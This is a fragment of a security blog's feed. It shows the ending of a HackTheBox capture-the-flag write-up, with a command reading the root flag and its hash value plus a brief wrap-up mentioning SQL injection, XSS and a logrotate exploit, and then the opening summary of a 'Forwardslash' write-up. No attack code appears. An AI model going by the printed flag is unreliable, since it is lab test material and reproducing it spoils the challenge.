+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ cat root.txt &lt;/span&gt;
+&lt;span class="code-line"&gt;84da92adf998a1c7231297f70dd89714&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;This box was really interesting as the web vulnerably can be found in real
+websites. The privilege escalation is quit simple at it just implies to exploit
+a known vulnerability.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Linux"></category><category term="SQLi"></category><category term="XSS"></category><category term="logrotate"></category><category term="CVE"></category></entry><entry><title>HTB: Forwardslash</title><link href="https://maggick.fr/2020/07/htb-forwardslash.html" rel="alternate"></link><published>2020-07-07T09:09:00+02:00</published><updated>2020-07-07T09:09:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-07:/2020/07/htb-forwardslash.html</id><summary type="html">&lt;p&gt;&lt;img alt="Forwardslash card" class="align-left" src="/media/2020.07/forwardslash_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/239"&gt;Forwardslash&lt;/a&gt; created by
 &lt;a href="https://www.hackthebox.eu/home/users/profile/52045"&gt;InfoSecJack&lt;/a&gt; and
